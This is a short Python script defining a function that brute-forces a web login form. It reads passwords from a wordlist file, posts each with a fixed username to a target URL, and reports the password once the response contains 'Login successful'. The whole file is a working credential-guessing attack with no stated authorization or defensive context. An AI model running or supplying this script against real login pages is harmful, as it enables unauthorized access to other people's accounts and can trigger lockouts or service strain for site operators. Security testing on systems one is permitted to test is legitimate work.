import requests

def brute_force_login(url, username, wordlist_path):
    print(f"Brute forcing {url} with username {username}")
    try:
        with open(wordlist_path, "r") as file:
            for password in file:
                password = password.strip()
                response = requests.post(url, data={"username": username, "password": password})
                if "Login successful" in response.text:
                    print(f"[+] Password found: {password}")
                    return
                else:
                    print(f"[-] Tried: {password}")
    except FileNotFoundError:
        print("Wordlist file not found.")
    except Exception as e:
        print(f"Error: {e}")
